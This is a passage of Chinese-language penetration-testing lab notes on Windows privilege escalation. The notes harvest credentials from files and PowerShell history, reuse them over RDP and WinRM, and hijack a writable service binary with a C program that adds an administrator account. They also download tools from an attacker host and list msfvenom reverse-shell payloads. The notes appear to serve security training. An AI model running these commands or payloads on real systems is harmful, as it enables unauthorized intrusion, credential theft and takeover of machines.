  TCP    192.168.187.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.187.220:3389    192.168.48.3:33770     ESTABLISHED     1148
  TCP    192.168.187.220:4444    192.168.48.3:58386     ESTABLISHED     2064
...
```
> `-a`：顯示所有連線與監聽 port (含 TCP 與 UDP)\
`-n`：使用數字格式顯示 IP 地址與端口 (不解析 DNS 或 hostname)\
`-o`：顯示對應的 PID，可用於對應 Task Manager 或 tasklist 來查詢哪個程序佔用端口
>>  80 和 443: Web Server\
>>  3306: MySQL Server\
>>  4444: 目前 nc 進來的 bind shell\
>>  3389: 看到來自 192.168.48.3 的 RDP 連線

#### - Get-ItemProperty 
檢查所有已安裝的應用程式
利用[兩個 registry keys](https://devblogs.microsoft.com/scripting/use-powershell-to-find-installed-software/) 列出 32-bit 和 64-bit 的應用程式
1. 查詢 32-bit (x86) 應用程式
>[!Important]
>`HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*`\
> 32-bit 應用程式存放的路徑 (Registry for 32-bit applications on Windows 64-bit systems)
```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname                                                       
-----------                                                                                                       
FileZilla 3.63.1                                                  
KeePass Password Safe 2.51.1                                      
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
```
> `select displayname`: 顯示  application name\

![image](https://hackmd.io/_uploads/SyLl75-9Jg.png)

2. 查詢 64-bit (x64) 應用程式
>[!Important]
>`HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*`\
> 32-bit 應用程式存放的路徑 (Registry for 32-bit applications on Windows 64-bit systems)
> > 顯示方式：`DisplayName`, `Publisher`, `InstallLocation`, `DisplayVersion` 並用 `Format-Table` 呈現

```
PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, Publisher, InstallLocation, DisplayVersion | Format-Table -AutoSize
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, Publisher, InstallLocation, DisplayVersion | Format-Table -AutoSize

DisplayName                                                    Publisher             InstallLocation                   
-----------                                                    ---------             ---------------                   
7-Zip 21.07 (x64)                                              Igor Pavlov           C:\Program Files\7-Zip\           

XAMPP                                                          Bitnami               C:\xampp                          
VMware Tools                                                   VMware, Inc.          C:\Program Files\VMware\VMware ...
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913 Microsoft Corporation                                   
Microsoft Update Health Tools                                  Microsoft Corporation                                   
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913    Microsoft Corporation                                   
Update for Windows 10 for x64-based Systems (KB5001716)        Microsoft Corporation  
```
![image](https://hackmd.io/_uploads/H1vM79W91g.png)
可以透過 public exploits 利用應用程式的漏洞

3. 檢查 `C:\Program Files` 與 `C:\Users\{user}}\Downloads`

#### - Get-Process
檢查哪些 process 正在運行
```
PS C:\Users\dave> Get-Process
Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     58      13      528       1088       0.00   2064   0 access                                                       
...                                                  
    369      32     9548      31320              2632   0 filezilla                                                    
...                                         
    188      29     9596      19716              3340   0 httpd                                                        
    486      49    16528      23060              4316   0 httpd                                                        
...                                                   
    205      17   210736      29228              3508   0 mysqld                                                       
...                                     
    982      32    83696      13780       0.59   2836   0 powershell                                                   
    587      28    65628      73752              9756   0 powershell                                                   
...
...
```
> bind shell: ID 2064\
> 當前執行的 PowerShell session: ID 9756
>> ID 3508 mysqld 能夠驗證先前猜測的 3306 port\
>> ID 4316 httpd 驗證先前猜測的 Apache 80/443

也可以推論 Apache 和 MySQL 都是透過 XAMPP 啟動的。

`PS C:\Users\dave> Get-Process | Select-Object ProcessName, Id, Path`
![image](https://hackmd.io/_uploads/rJP729Wcke.png)

### Hidden in Plain View
在 meeting notes, configuration files, or onboarding documents 等等尋找敏感資訊

#### 1. 尋找 sensitive information
範例: 當在 CLIENTWK220 找到 password manager，
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.171.220 4444      
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>powershell
...
PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
> 在整個 C:\ 中搜尋所有符合 `.kdbx` 的檔案\
> (KeePass 密碼資料庫檔案)
>> 但沒有找到

接著搜尋 `*.txt` 與 `*.ini` (configuration files)
```
PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
...
Directory: C:\xampp\mysql\bin

Mode                 LastWriteTime         Length Name                                               
----                 -------------         ------ ----                                               
-a----         6/16/2022   1:42 PM           5786 my.ini
...
Directory: C:\xampp

Mode                 LastWriteTime         Length Name                                              
----                 -------------         ------ ----                                                                 
-a----         3/13/2017   4:04 AM            824 passwords.txt
-a----         6/16/2022  10:22 AM            792 properties.ini     
-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
-a----         6/16/2022   1:17 PM           1200 xampp-control.ini
```
> `C:\xampp\mysql\bin\my.ini` 與 `C:\xampp\passwords.txt` 可能找到敏感資訊

```
PS C:\Users\dave> type C:\xampp\passwords.txt
type C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...

PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
type C:\xampp\mysql\bin\my.ini
type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
At line:1 char:1
+ type C:\xampp\mysql\bin\my.ini
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
   ception
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
> `C:\xampp\passwords.txt` 僅包含未修改的XAMPP 預設密碼，且沒有權限查看 `C:\xampp\mysql\bin\my.ini` 的內容

接著搜尋 User 路徑下的 `*.txt`,`*.pdf`,`*.xls`,`*.xlsx`,`*.doc`,`*.docx`:
```
PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\dave\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/16/2022  11:28 AM            339 asdf.txt                                                             

PS C:\Users\dave> cat Desktop\asdf.txt
cat Desktop\asdf.txt
notes from meeting:
- Contractors won't deliver the web app on time
- Login will be done via local user credentials
- I need to install XAMPP and a password manager on my machine 
- When beta app is deployed on my local pc: 
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++

```
> 嘗試 Steve:securityIsNotAnOption++++++ 

先看 Steve 有什麼功能
```
PS C:\Users\dave> net user steve
net user steve
User name                    steve
...
Last logon                   6/16/2022 1:03:52 PM

Logon hours allowed          All

Local Group Memberships      *helpdesk             *Remote Desktop Users 
                             *Remote Management Use*Users                
...
```
> steve 不是 Administrator
>> `* Remote Desktop Users`
>> `* Remote Management Use`
#### 2. 利用 sensitive information 嘗試登入
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:Steve /p:securityIsNotAnOption++++++ /v:192.168.171.220
```
![image](https://hackmd.io/_uploads/SJScos-5kl.png)
> 成功登入 Steve

查看先前 dave 無法查看的 `C:\xampp\mysql\bin\my.ini`
```
PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
# Example MySQL config file for small systems.
...

# The following options will be passed to all MySQL clients
# backupadmin Windows password for backup job
[client]
password       = admin123admin123!
port=3306
socket="C:/xampp/mysql/mysql.sock"
```
> 找到 Mysql pwd: `admin123admin123!`\
> comment 說明也可能是 backupadmin 的 pwd

#### 3. 查看 backupadmin 權限
```
PS C:\Users\steve> net user backupadmin
User name                    BackupAdmin
...

Local Group Memberships      *Administrators       *BackupUsers
                             *Users
Global Group memberships     *None
The command completed successfully.
```
> backupadmin 是 Administrators
> 但不是 Remote Desktop Users 及 Remote Management Users
> > 代表需要以其他方式存取系統

>[!Important]
> **Runas（需 GUI）:** 類似 Linux 的 sudo
> `runas /user:backupadmin cmd.exe`\
> 當 runas 無法使用時，其他可嘗試的方法：\
> ![image](https://hackmd.io/_uploads/rkdC0i-qJg.png)
> * [Log on as a batch job 說明](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-batch-job)

#### 4. runas 
```
PS C:\WINDOWS\system32> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
```
![image](https://hackmd.io/_uploads/r1Bj1hZcyl.png)
> Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.\
> 成功進入 backupadmin

滲透路徑 review: \
sensitive information 👉🏻 dave 👉🏻 steve 👉🏻 (privileged) backupadmin

### Information Goldmine PowerShell
Two important logging mechanisms for PowerShell:
* [PowerShell Transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5)\
又稱 over-the-shoulder-transcription。啟用後，記錄的資訊就像是從旁邊觀察使用者輸入 PowerShell 。記錄的內容會被存儲在 transcript files，這些檔案通常會保存在:
    1. 使用者的 /home 
    2. 所有使用者共用目錄
    3. network share collecting 的 configured machines

    這樣的 record 能夠追蹤到使用者在 PowerShell 中輸入的每一個 command，對於監控系統活動非常有效。
* [PowerShell Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)\
記錄執行過程中的 commands 和 blocks of script code，當一個命令或腳本區塊執行時，它會將命令的完整內容作為事件記錄下來。這比 Transcription 更廣泛，因為它會捕捉到指令的完整內容，包括編碼過的 command 或 code。

以上兩個 mechanisms 在企業中越來越普遍，增加了防禦視角，但也同時提供 attackers 有價值的資訊。

範例提供：enabled logging mechanisms and the PowerShell history 來取得 PowerShell 記錄的資訊

#### 1. check the PowerShell history 
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.171.220 4444 
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>powershell
powershell
...

PS C:\Users\dave> Get-History
Get-History

```
> 沒有紀錄，可能被使用者透過 `Clear-History` 指令刪除

🥚 這個 Cmdlet 只會清除 user 自己的歷史記錄，可以使用 `Get-History` 截取
>[!Important]
> PowerShell v5、v5.1 和 v7 起，[PSReadline](https://learn.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-7.5&viewFallbackFrom=powershell-7.2) 的模組 ，可以用於行編輯和命令歷史記錄。\
> Clear-History 不會清除 PSReadline 記錄的 cmd history

在 Get-PSReadlineOption module 中取用 HistorySavePath
```
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
(Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ls
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```
> 1. dave 使用模組 `SecretManagement.keepass` 執行了 Register-SecretVault，表示 dave  在 KeePass 建立了一個新的密碼管理器DB。\
> 2. 接著 dave 使用 `Set-Secret` 在密碼管理器中建立了一個秘密或項目，名稱為 `Server02 Admin PW:paperEarMonitor33@`，可能是另一個系統的憑證。\
> 3. 最後，dave 使用 `Start-Transcript` 啟動 PowerShell 轉錄。此 cmd 包含儲存 transcript file 的路徑 `C:\Users\Public\Transcripts\transcript01.txt`。
    > 3.1  [`Enter-PSSession`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)，這是一個用來啟動遠端 PowerShell 會話的指令
    > 3.2 使用 `-ComputerName` 參數指定本機
    > 3.3 `-Credential` 參數來提供一個 [PSCredential](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential) 物件 $cred，該物件包含了使用者的帳號和密碼。
> > 所以建立了一個遠端 PowerShell 會話，連接到名為 CLIENTWK220 的電腦，並使用 $cred 中的認證資訊（帳號和密碼）進行身份驗證。

#### 2. 檢查有效資訊
查看 `C:\Users\Public\Transcripts\transcript01.txt`
```
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.22000.282
BuildVersion: 10.0.22000.282
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************

```
> 成功發現 variable $cred

#### 3. 建立 PSCredential object，偽造驗證
首先建立一個 [SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring) 來儲存密碼，並創建 PSCredential object 來偽造 dave history 中建立的 logging mechanisms\
(複製 Transcript 的步驟即可)
```
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin
```
> 驗證成功後，以 daveadmin 的身份透過 WinRM 啟動 PowerShell 遠端會話
```
[CLIENTWK220]: PS C:\Users\daveadmin\Documents> cd C:\
cd C:\

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> pwd
pwd

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> dir
dir
```
> 但指令沒辦法正常執行
>> 檢查目前環境：
>> 使用 bind shell 再透過 WinRM 建立 PowerShell 遠端會話
>> 可能會 unexpected behavior

#### 4. 使用 WinRM 連線
在 Kali 直接使用 [evil-winrm](https://github.com/Hackplayers/evil-winrm) 透過 WinRM 連線到 CLIENTWK220
```
┌──(chw㉿CHW)-[~]
└─$ evil-winrm -i 192.168.171.220 -u daveadmin -p "qwertqwertqwert123\!\!"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd /
*Evil-WinRM* PS C:\> 

```
> 成功執行 cmd

>[!Caution]
>Administrators can prevent PSReadline from recording commands by setting the -HistorySaveStyle option to SaveNothing with the [Set-PSReadlineOption](https://learn.microsoft.com/en-us/powershell/module/psreadline/set-psreadlineoption?view=powershell-7.2) Cmdlet. Alternatively, they can clear the history file manually.

#### Use the Event Viewer to search for events recorded by Script Block Logging
![image](https://hackmd.io/_uploads/r1F03pWcyl.png)
![image](https://hackmd.io/_uploads/ByizT6bcJg.png)

### Automated Enumeration
#### 1. Windows 自動化提權工具: [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
在 Kali Linux 上安裝 peass 套件，可透過 Python Web 伺服器 將 winPEAS 提供給 Windows 目標機器執行。
```
┌──(chw㉿CHW)-[~]
└─$ sudo apt update
sudo apt install -y peass
[sudo] password for chw: 
...
┌──(chw㉿CHW)-[~]
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .

┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) 
|
```
接著 nc bind shell 到目標機器
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.170.220 4444
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.45.186/winPEASx64.exe -Outfile winPEAS.exe  
iwr -uri http://192.168.45.186/winPEASx64.exe -Outfile winPEAS.exe
```
> 使用 `Invoke-WebRequest` (iwr 的縮寫) 遠端伺服器下載 winPEASx64.exe

最後執行 winPEASx64
```
PS C:\Users\dave> .\winPEAS.exe
```
(Users output section)\
![image](https://hackmd.io/_uploads/B1yVQiVckl.png)

#### 2. [Seatbelt](https://github.com/GhostPack/Seatbelt)
GhostPack-Compiled Binaries: [r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?utm_source=chatgpt.com)

## Leveraging Windows Services
[Windows Service](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications) 由 [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) 負責管理背景程式或應用程式，類似 Unix 的 [daemons](https://en.wikipedia.org/wiki/Daemon_(computing))。\
Windows services 可以透過 Services snap-in, PowerShell 或  sc.exe command line tool

### Service Binary Hijacking
每個 Windows Services 都有對應的 Binary File，在可執行檔權限配置不當時，低權限的使用者可能可以修改或替換這個二進位檔。\
開發人員安裝了一個 application 作為 Windows 服務。安裝時，該應用程式的權限配置錯誤，允許 Users group 擁有 R-W 權限。\
顯示 Windows services:
- GUI snap-in services.msc
- Get-Service Cmdlet
- Get-CimInstance Cmdlet (superseding Get-WmiObject)

>[!Caution]
> 當使用 network logon（例如 WinRM 或 bind shell）時，`Get-CimInstance` 和 `Get-Service` 在使用非管理員權限查詢服務時會導致 "permission denied" 。使用 RDP 登入可以解決此問題。

#### 1. Get-CimInstance 查詢 WMI 
使用 Get-CimInstance 來查詢 WMI class [win32_service](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes) (win32_service class 包含所有 Windows 服務的資訊)，查看 Name, State, and PathName，並使用 `Where-Object` 過濾掉任何未運作狀態的服務
```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```
> `Get-CimInstance`：查詢 Windows Management Instrumentation（WMI）\
> `{$_.State -like 'Running'}`: 
>- `$_`: 代表 pipeline 傳遞的每個物件（即每個 Windows 服務）
>- `$.State` 指的是服務的狀態
>- `like 'Running'`：只顯示 State 欄位 "Running" 的服務

兩個 XAMPP 服務的 Apache2.4 and mysql，路徑位置在 `C:\xampp\ ` 而非 `C:\Windows\System32`，代表是 user 自己安裝的

#### 2. enumerate service binaries 的權限
兩種工具:
- [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)（Windows 內建工具，可在 PowerShell 和 cmd 中使用）。
![image](https://hackmd.io/_uploads/Hyz5a5r9Jl.png)

- [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)（PowerShell Cmdlet）

使用 icacls 查看 httpd.exe 與 mysqld.exe
```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files

PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```
> `httpd.exe`: dave 只有 RX，不能寫入\
> `mysqld.exe`: dave 有 Full Access (F) permission

#### 3. 建立 binary 並 Cross-Compilation
在 kali 上建立 small binary，來取代 mysqld.exe\
用 C code 創建新的 user，利用 system() 將 user 加入 Administrators group
adduser.c
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

接著 利用 mingw-64 Cross-Compilation 成 exe file
(目標機器為 64-bit)
```
┌──(chw㉿CHW)-[~]
└─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
#### 4. 將 compiled EXE 取代 original exe
```
PS C:\Users\dave> iwr -uri http://192.168.45.188/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
PS C:\Users\dave>
```
> `mysqld.exe` 備份到當前目錄，再將 `adduser.exe` 匯入

重啟服務
```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```
> dave 沒有權限重啟

>[!Tip]
>If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

可使用 `Get-CimInstance` 查看 Name and StartMode
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
確認 dave 系統權限:
```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
...
```
> Shut down the system: Disabled
>> 未使用 SeShutdownPrivilege 權限

嘗試使用 shutdown
```
shutdown /r /t 0
```

#### 5. 重啟服務後，執行 interactive shell
確認 adduser.exe 是否成功覆蓋 mysqld.exe
```
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```
> dave2 成功新增

執行 interactive shell 兩種方法
##### (1) Runas
(可參考 [本章 #Hidden-in-Plain-View 3.](#Hidden-in-Plain-View))\
```
PS C:\Users\dave> runas /user:dave2 cmd
```
![image](https://hackmd.io/_uploads/ryrPojScye.png)

##### (2) msfvenom
使用 [msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) 新增 executable file 執行 reverse shell
 
>[!Important]
> msfvenom 範例：\
>`msfvenom -p <PAYLOAD> -f <FORMAT> -o <輸出檔案> <選項>`
> - Windows reverse shell:\
> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o chw.exe`
> - Linux reverse shell:\
> `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o chw.elf`
> - PHP reverse Shell:\
> `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > chw.php`
> - PowerShell code:\
> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh > chw.ps1`
> - Base64 encode PowerShell code:\
> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd`

#### 6. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) automated tool
```
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```
##### 6.1 使用 `ExecutionPolicy Bypass` 啟動 powershell
##### 6.2 使用 Get-ModifiableServiceFile 來尋找可修改的服務，例如服務二進位檔案或設定檔。
```
PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1

PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```
> `mysql` 服務的可執行檔 mysqld.exe 可被 BUILTIN\Users 群組成員（如 dave）修改。\
但 CanRestart 為 False，所以無法直接重新啟動服務來觸發權限提升，可能需要重新開機。

##### 6.3 嘗試利用 Install-ServiceBinary
```
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```
> PowerUp 檢測到 mysqld.exe 可被修改\
但 `Install-ServiceBinary` 卻判斷 mysql 服務無法被利用

##### 6.4 分析 PowerUp 為何判斷錯誤
```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}
```
> 表示 mysqld.exe 確實可被 BUILTIN\Users 修改

加上參數:
```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal

PS C:\Users\dave> $ModifiableFiles

